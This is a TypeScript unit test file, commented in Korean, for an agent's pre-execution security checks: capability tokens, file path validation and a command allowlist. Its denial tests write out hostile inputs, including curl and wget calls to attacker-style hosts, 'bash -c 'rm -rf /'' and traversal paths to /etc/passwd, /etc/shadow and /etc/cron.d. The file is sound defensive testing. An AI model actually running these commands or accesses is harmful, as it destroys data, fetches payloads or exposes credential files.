// Pre-Hook 보안 검증 단위 테스트 — 액션 실행 직전 보안 크리티컬 경로를 포괄적으로 테스트

import { describe, it, expect } from "vitest";
import {
  validateCapabilityForAction,
  validateFilePath,
  validateCommand,
  validatePreExecution,
} from "./pre-hook.js";
import type { CapabilityToken } from "@jarvis/shared";
import type { ActionRequest, ActionType } from "../types/action-types.js";

// 테스트용 CapabilityToken mock 생성 헬퍼
function makeToken(
  overrides?: Partial<CapabilityToken>
): CapabilityToken {
  return {
    tokenId: "tok-001",
    issuedAt: new Date().toISOString(),
    issuedBy: "policy-risk",
    approvedBy: "user-001",
    grant: {
      cap: "fs.read",
      scope: ["/project/src"],
      ttlSeconds: 900,
      maxUses: 1,
    },
    context: {
      sessionId: "session-001",
      runId: "run-001",
      policyDecisionId: "pd-001",
      trustMode: "semi-auto",
    },
    status: "ACTIVE",
    consumedAt: null,
    consumedByAction: null,
    revokedReason: null,
    ...overrides,
  };
}

// 테스트용 ActionRequest mock 생성 헬퍼
function makeAction(
  actionType: ActionType,
  params: Record<string, unknown> = {}
): ActionRequest {
  return {
    actionId: `action-${actionType.toLowerCase()}`,
    actionType,
    params,
    requiresCapabilities: [],
    riskTags: [],
    preconditions: [],
    postconditions: [],
    evidence: {
      captureScreenshot: false,
      captureStdout: false,
    },
  };
}

// ──────────────────────────────────────────────
// validateCapabilityForAction 테스트
// ──────────────────────────────────────────────
describe("validateCapabilityForAction", () => {
  it("ACTIVE 상태 토큰과 올바른 Capability로 ok(true)를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({ grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 900, maxUses: 1 } });

    // Act
    const result = validateCapabilityForAction(token, "FS_READ");

    // Assert
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value).toBe(true);
    }
  });

  it("CONSUMED 상태 토큰은 CAPABILITY_CONSUMED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({ status: "CONSUMED" });

    // Act
    const result = validateCapabilityForAction(token, "FS_READ");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("CAPABILITY_CONSUMED");
    }
  });

  it("REVOKED 상태 토큰은 CAPABILITY_CONSUMED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({ status: "REVOKED" });

    // Act
    const result = validateCapabilityForAction(token, "FS_READ");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      // 토큰 상태 유효하지 않음 — ACTIVE가 아니면 CAPABILITY_CONSUMED 에러
      expect(result.error.code).toBe("CAPABILITY_CONSUMED");
    }
  });

  it("TTL이 초과된 만료 토큰은 CAPABILITY_EXPIRED 에러를 반환해야 한다", () => {
    // Arrange — issuedAt을 과거로 설정하고 ttlSeconds를 1로 설정하여 만료 재현
    const expiredIssuedAt = new Date(Date.now() - 10_000).toISOString();
    const token = makeToken({
      issuedAt: expiredIssuedAt,
      grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 1, maxUses: 1 },
    });

    // Act
    const result = validateCapabilityForAction(token, "FS_READ");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("CAPABILITY_EXPIRED");
    }
  });

  it("Capability 불일치 (fs.read 토큰으로 FS_WRITE 시도) 시 CAPABILITY_SCOPE_MISMATCH 에러를 반환해야 한다", () => {
    // Arrange — fs.read 토큰으로 fs.write 액션 시도
    const token = makeToken({
      grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 900, maxUses: 1 },
    });

    // Act
    const result = validateCapabilityForAction(token, "FS_WRITE");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("CAPABILITY_SCOPE_MISMATCH");
    }
  });

  it("EXPIRED 상태 토큰은 CAPABILITY_CONSUMED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({ status: "EXPIRED" });

    // Act
    const result = validateCapabilityForAction(token, "FS_READ");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      // status !== "ACTIVE"이면 CAPABILITY_CONSUMED 반환
      expect(result.error.code).toBe("CAPABILITY_CONSUMED");
    }
  });
});

// ──────────────────────────────────────────────
// validateFilePath 테스트
// ──────────────────────────────────────────────
describe("validateFilePath", () => {
  it("Unix 절대 경로는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/project/src/index.ts", "read");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("Windows 절대 경로는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("C:\\Users\\user\\project\\file.ts", "write");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("상대 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("src/index.ts", "read");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'../' 경로 탐색 패턴은 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/project/src/../../etc/passwd", "read");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'/etc/' 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/etc/shadow", "read");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'/proc/' 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/proc/1/mem", "read");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'/sys/' 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/sys/kernel/debug", "write");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'/dev/' 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("/dev/null", "write");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("'~/' 홈 디렉토리 경로는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateFilePath("~/Documents/secret.txt", "read");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });
});

// ──────────────────────────────────────────────
// validateCommand 테스트
// ──────────────────────────────────────────────
describe("validateCommand", () => {
  it("'pnpm' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("pnpm install");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'npm' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("npm run build");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'node' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("node --version");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'tsc' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("tsc --noEmit");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'vitest' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("vitest run");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'eslint' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("eslint src/");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'git' 허용 명령어는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("git status");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("경로 접두사가 붙은 허용 명령어 ('/usr/bin/node')는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("/usr/bin/node index.js");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("경로 접두사가 붙은 허용 명령어 ('/usr/local/bin/pnpm')는 ok(true)를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("/usr/local/bin/pnpm install");

    // Assert
    expect(result.ok).toBe(true);
  });

  it("'curl' 금지 명령어는 POLICY_DENIED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("curl https://malicious.example.com");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("POLICY_DENIED");
    }
  });

  it("'wget' 금지 명령어는 POLICY_DENIED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("wget http://example.com/payload");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("POLICY_DENIED");
    }
  });

  it("'bash' 금지 명령어는 POLICY_DENIED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("bash -c 'rm -rf /'");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("POLICY_DENIED");
    }
  });

  it("빈 문자열 명령어는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("공백만 있는 명령어는 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange & Act
    const result = validateCommand("   ");

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });
});

// ──────────────────────────────────────────────
// validatePreExecution 테스트
// ──────────────────────────────────────────────
describe("validatePreExecution", () => {
  it("토큰이 null이면 CAPABILITY_EXPIRED 에러를 반환해야 한다", () => {
    // Arrange
    const actions = [makeAction("FS_READ", { path: "/project/src/index.ts" })];

    // Act
    const result = validatePreExecution(actions, null);

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("CAPABILITY_EXPIRED");
    }
  });

  it("액션 수가 토큰의 maxUses를 초과하면 CAPABILITY_SCOPE_MISMATCH 에러를 반환해야 한다", () => {
    // Arrange — maxUses: 1인데 액션 2개 시도
    const token = makeToken({
      grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 900, maxUses: 1 },
    });
    const actions = [
      makeAction("FS_READ", { path: "/project/src/a.ts" }),
      makeAction("FS_READ", { path: "/project/src/b.ts" }),
    ];

    // Act
    const result = validatePreExecution(actions, token);

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("CAPABILITY_SCOPE_MISMATCH");
    }
  });

  it("FS_READ 액션에 path traversal 경로가 있으면 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({
      grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 900, maxUses: 5 },
    });
    const actions = [makeAction("FS_READ", { path: "/project/src/../../etc/passwd" })];

    // Act
    const result = validatePreExecution(actions, token);

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("FS_WRITE 액션에 path traversal 경로가 있으면 VALIDATION_FAILED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({
      grant: { cap: "fs.write", scope: ["/project"], ttlSeconds: 900, maxUses: 5 },
    });
    const actions = [makeAction("FS_WRITE", { path: "/project/../etc/cron.d/malicious" })];

    // Act
    const result = validatePreExecution(actions, token);

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
  });

  it("EXEC_RUN 액션에 금지 명령어가 있으면 POLICY_DENIED 에러를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({
      grant: { cap: "exec.run", scope: ["*"], ttlSeconds: 900, maxUses: 5 },
    });
    const actions = [makeAction("EXEC_RUN", { command: "curl https://attacker.example.com" })];

    // Act
    const result = validatePreExecution(actions, token);

    // Assert
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("POLICY_DENIED");
    }
  });

  it("정상 배치 (FS_READ 2개 액션, maxUses: 2)는 passed: true, checkedActions: 2를 반환해야 한다", () => {
    // Arrange
    const token = makeToken({
      grant: { cap: "fs.read", scope: ["/project"], ttlSeconds: 900, maxUses: 2 },
    });
    const actions = [
      makeAction("FS_READ", { path: "/project/src/index.ts" }),
      makeAction("FS_READ", { path: "/project/src/utils.ts" }),
    ];

    // Act
    const result = validatePreExecution(actions, token);

    // Assert
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.passed).toBe(true);
      expect(result.value.checkedActions).toBe(2);
      expect(result.value.failedAction).toBeNull();
    }
  });

  it("빈 액션 배열은 passed: true, checkedActions: 0을 반환해야 한다", () => {
    // Arrange
    const token = makeToken();

    // Act
    const result = validatePreExecution([], token);

    // Assert
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.passed).toBe(true);
      expect(result.value.checkedActions).toBe(0);
    }
  });
});
